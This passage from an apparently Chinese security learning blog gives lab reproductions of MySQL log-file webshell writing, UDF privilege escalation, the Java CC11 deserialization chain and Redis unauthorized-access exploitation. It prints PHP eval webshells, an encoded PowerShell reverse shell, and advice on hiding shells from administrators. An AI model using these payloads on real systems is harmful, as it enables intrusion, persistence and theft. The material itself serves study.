<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                                           |</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">| general_log      | OFF                                                             |</span><br><span class="line">| general_log_file | C:\phpstudy_pro\Extensions\MySQL5.1.60\data\WINDOWS-M9UNPKC.log |</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>第一个参数需要<code>general_log</code>是ON的状态，这样mysql才会记录每一条记录，第二个参数<code>general_log_file</code>是日志的文件路径</p>
<p>如果要写入shell，两个参数都要修改，如果是注入，可以利用到堆叠注入</p>
<p>用到一个源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)):</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br></pre></td></tr></table></figure>

<p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p>
<p>在windows用这个给文件夹权限设置宽松</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls &quot;C:\phpstudy_pro\WWW&quot;  /grant Everyone:(F) /T</span><br></pre></td></tr></table></figure>

<p>Linux是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod -R 777 /var/www/html</span><br></pre></td></tr></table></figure>

<p>如果遇到堆叠注入，payload可以这样写</p>
<p>先修改两个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;;set global general_log = &quot;ON&quot;;set global general_log_file=&#x27;C:\phpstudy_pro\WWW\shell.php&#x27;;--+</span><br></pre></td></tr></table></figure>

<p>直接在数据库测试了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; set global general_log = &quot;ON&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SET GLOBAL general_log_file=&quot;C:\\phpstudy_pro\\WWW\\shell.php&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">+------------------+-------------------------------+</span><br><span class="line">| Variable_name    | Value                         |</span><br><span class="line">+------------------+-------------------------------+</span><br><span class="line">| general_log      | ON                            |</span><br><span class="line">| general_log_file | C:\phpstudy_pro\WWW\shell.php |</span><br><span class="line">+------------------+-------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>然后尝试写入shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;; select &#x27;&lt;?php eval(@$_GET[&#x27;a&#x27;]);?&gt;&#x27;</span><br></pre></td></tr></table></figure>

<p>写入后，注意这里要闭合好，不然没办法正常执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\phpstudy_pro\www&gt; type .\shell.php</span><br><span class="line">C:\phpstudy_pro\COM\..\Extensions\MySQL5.1.60\\bin\mysqld.exe, Version: 5.1.60-community (MySQL Community Server (GPL)). started with:</span><br><span class="line">TCP Port: 3306, Named Pipe: MySQL</span><br><span class="line">Time                 Id Command    Argument</span><br><span class="line">250226  1:14:58   260 Query     select &#x27;&lt;?php eval(@$_GET[&#x27;a&#x27;]);?&gt;&#x27;</span><br><span class="line">                  260 Query     show warnings</span><br></pre></td></tr></table></figure>

<p>尝试生存个powershell的payload也能成功反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/shell.php?a=system(%27powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADYANAAuADEAOAA3ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==%27);</span><br></pre></td></tr></table></figure>

<h5 id="慢查询"><a href="#慢查询" class="headerlink" title="慢查询"></a>慢查询</h5><p>思路是差不多的，修改的参数不一样而已</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;		--查看慢查询信息</span><br><span class="line">set global slow_query_log=1;				--启用慢查询日志(默认禁用)</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;	--修改日志文件路径</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27; or sleep(11);				--写shell</span><br></pre></td></tr></table></figure>

<p>为什么要用慢查询，只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志，一般都是通过<code>long_query_time</code>选项来设置这个时间值，时间以秒为单位，可以精确到微秒。</p>
<p>通常情况下执行<code>sql</code>语句时的执行时间一般不会超过10s，所以说这个日志文件应该是比较小的，而且默认也是禁用状态，不会引起管理员的察觉。拿到shell后上传一个新的shell，删掉原来shell，新shell做隐藏，这样shell可能还能活的时间长些</p>
<h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><p>在MySQL&gt;&#x3D;5.1的版本，我们可以创建自定义函数的方式来执行恶意代码，添加的函数可以在select中使用，就像使用version()一样方便</p>
<p>sqlmap和Metasploit都提供了动态链接库，直接用就行</p>
<p>这次用的版本是<code>5.7.26</code></p>
<h5 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录"></a>寻找插件目录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">+---------------+---------------------------------------------------+</span><br><span class="line">| Variable_name | Value                                             |</span><br><span class="line">+---------------+---------------------------------------------------+</span><br><span class="line">| plugin_dir    | C:\phpstudy_pro\Extensions\MySQL5.7.26\lib/plugin |</span><br><span class="line">+---------------+---------------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<h5 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h5><p>secure_file_priv 要是<strong>空的！空的！空的！</strong></p>
<p>如果有sql注入且是高权限，plugin目录可写，secure_file_priv 无限制，这个时候可以直接用sqlmap跑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.64.145/sql/sql2-2?id=1&#x27; --file-write=/Users/lingtian/downloads/lib_mysqludf_sys_64.dll --file-dest=&#x27;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf1.dll&#x27;</span><br></pre></td></tr></table></figure>

<p>如果没有注入，可以在secure_file_priv 无限制的情况下，手工写到插件目录下</p>
<p>借鉴<a class="link"   href="https://www.sqlsec.com/tools/udf.html" >国光师傅的payload<i class="fas fa-external-link-alt"></i></a>，成功写入执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf1.dll&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+----------+-----+----------+----------+</span><br><span class="line">| name     | ret | dl       | type     |</span><br><span class="line">+----------+-----+----------+----------+</span><br><span class="line">| sys_eval |   0 | udf1.dll | function |</span><br><span class="line">+----------+-----+----------+----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select sys_eval(&#x27;whoami&#x27;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| sys_eval(&#x27;whoami&#x27;)    |</span><br><span class="line">+-----------------------+</span><br><span class="line">| windows-m9unpkc\admin |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.53 sec)</span><br></pre></td></tr></table></figure>

<p>如果不想要一大串十六进制的东西，可以先加载dll写到一个文件，在dumpfile写进去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table foo (xxx blob);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(&#x27;C:\\Users\\admin\\Downloads\\lib_mysqludf_sys_32.dll&#x27;));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from foo into dumpfile &quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\111.dll&quot;;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">后面的加载函数同上</span><br></pre></td></tr></table></figure>

<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a class="link"   href="https://www.sqlsec.com/2020/11/mysql.html" >https://www.sqlsec.com/2020/11/mysql.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://drun1baby.top/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/" >https://drun1baby.top/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html" >https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h4><p>先大概写到这里，虽然不是很难，但是复现真的花了一些时间，有些小细节要注意，用户权限，文件夹宽松权限，secure_file_priv要是空的，这些都要注意！</p>
]]></content>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>cc11学习笔记</title>
    <url>/2025/02/26/cc11%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>保持学习感觉，趁热打铁学下去🤓</p>
<p>说是CC11比较好用，后续会接触到，既可以加载恶意类，影响版本也比较广，学习！</p>
<h4 id="CC11分析"><a href="#CC11分析" class="headerlink" title="CC11分析"></a>CC11分析</h4><p>这条链子说是CC2+CC6结合，后面利用到恶意类加载，简单回顾一下之前两条链子</p>
<p>之前在学CC3涉及到恶意类加载已经写过了CC6的恶意类加载版本</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchFieldException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(null);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 有一个decorateMap是LazyMap修饰过的</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再套一层TiedMapEntry</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        decorateMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射修改factory的值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(decorateMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName,Object fieldValue)</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,fieldValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先比最开始的用多个组合<code>InvokerTransformer</code>成<code>ChainedTransformer</code>的版本，这个版本把<code>templates</code>和一个能调用<code>TemplatesImpl.newTransformer</code>的<code>InvokerTransformer</code>组合成新的<code>ChainedTransformer</code>，后面其他的没有怎么变。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227000944.png"  alt="看图应该好理解一些"></p>
<p>而现在的CC11直接不用<code>Transformer</code>这个类，因为没必要，把有恶意字节码的<code>templates</code>当成key被加载进去就好了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">    setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">    setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// ChainedTransformer chainedTransformer = new ChainedTransformer(invokerTransformer);</span></span><br><span class="line">  </span><br><span class="line">  	<span class="comment">// 这部分基本和原来的CC6后部分一致</span></span><br><span class="line">    HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">decoratedMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decoratedMap,templates); <span class="comment">// 这次传入的“key”是templates</span></span><br><span class="line">    HashMap&lt;Object,Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    expMap.put(tiedMapEntry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    decoratedMap.remove(templates);</span><br><span class="line"></span><br><span class="line">    setFieldValue(decoratedMap,<span class="string">&quot;factory&quot;</span>,invokerTransformer);</span><br><span class="line"></span><br><span class="line">    serialize(expMap);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正着看一下逻辑，这次不把templates包进Transformer，而是直接</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decoratedMap,templates);</span><br></pre></td></tr></table></figure>

<p>如果对应看TiedMapEntry这个类的构造函数，会发现</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227002053.png" ></p>
<p>此时在TiedMapEntry里面，map是<code>decoratedMap</code>，我们会控制它是LazyMap，key是 <code>templates</code>我们知道链子会触发getValue()，进入后，也就是LazyMap.get()，之前我们不会在乎括号里的<code>this.key</code>是什么，这次我们把<code>templates</code>传进去，一直跟进</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-02-27%2000.24.15.png" ></p>
<p>此时transformer里面</p>
<blockquote>
<p>Input -&gt; templates</p>
<p>this.iMethodName -&gt; newTransformer</p>
</blockquote>
<p>那这样对应的代码效果就是，反射执行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure>

<p>那就达成我们的目的，恶意类加载，整体思路就是这样，还是很好理解的！</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>redis未授权漏洞复现</title>
    <url>/2025/02/27/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>继续增加实操经历！</p>
<p>Redis 默认情况下，会绑定在 0.0.0.0:6379（<strong>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</strong>），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等。</p>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>影响版本  2.x，3.x，4.x，5.x</p>
<p>这边直接在Ubuntu上装了个redis，在<a class="link"   href="http://download.redis.io/releases/" >这个链接<i class="fas fa-external-link-alt"></i></a>下载历史版本的redis，本地编译后修改一下配置文件redis.conf</p>
<p>把这个保护模式从yes改成no，允许别的主机远程连接</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227135315.png" ></p>
<p>把绑定ip这一行给注释掉，允许除本地外的主机远程登录redis服务</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227135359.png" ></p>
<p>然后开启redis-server，这里我的版本是3.2.7</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227141637.png" ></p>
<p>在kali这边连接，尝试ping，看到pong表示连接成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227141821.png" ></p>
<h4 id="利用未授权写入webshell"><a href="#利用未授权写入webshell" class="headerlink" title="利用未授权写入webshell"></a>利用未授权写入webshell</h4><p><strong>条件</strong></p>
<ul>
<li>服务器的redis存在未授权，攻击机可以直接连接登陆</li>
<li>服务器开了web服务器，攻击者知道web根目录</li>
<li>对web目录有写入权限</li>
</ul>
<p>写入webshell思路是指定本地数据库存放目录设置为&#x2F;var&#x2F;www&#x2F;html，指定本地数据库文件名为shell.php，于是我们就可以写入一个路径为&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php的Webshell文件</p>
<p>原理是我们在数据库中插入一条webshell代码数据，代码作为value，key随便，相当于把缓冲数据保存在shell.php里</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.64.189:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/ </span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; <span class="built_in">set</span> xxx <span class="string">&quot;&lt;?php eval(<span class="variable">$_POST</span>[&#x27;whoami&#x27;]);?&gt;&quot;</span> </span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227143818.png" ></p>
<p>可以看到是成功的，这里注意有伤害代码要写成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set xxx &quot;\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n\r\n&quot;</span><br></pre></td></tr></table></figure>

<p>多增加了一些换行符，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227144022.png" ></p>
<h4 id="利用未授权写入ssh公钥"><a href="#利用未授权写入ssh公钥" class="headerlink" title="利用未授权写入ssh公钥"></a>利用未授权写入ssh公钥</h4><p>思路也是一样的，这次把数据库默认路径改成&#x2F;root&#x2F;.ssh，缓冲文件名改为authorized.keys</p>
<p>先生成公私钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>

<p>在&#x2F;root&#x2F;.ssh下会有id_rsa.pub，读取出来写到目标路径里</p>
